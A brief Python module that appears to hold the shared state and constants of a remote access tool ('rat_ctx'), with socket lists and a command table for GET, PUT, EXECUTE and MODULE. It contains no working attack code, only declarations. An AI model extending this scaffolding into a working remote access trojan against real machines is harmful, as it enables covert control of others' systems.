import host

rat_ctx = {}
host_list = host.Host_Container()
bound_socks = []
listen_socks = []
send_socks = []

cmd_lookup = {"GET": 0, "PUT": 1, "EXECUTE": 2, "MODULE": 3, "close_session": 4}

HEADER_LEN = 16
INT_SIZE = 4
DISCONNECTED = 2
CONNECTED = 1
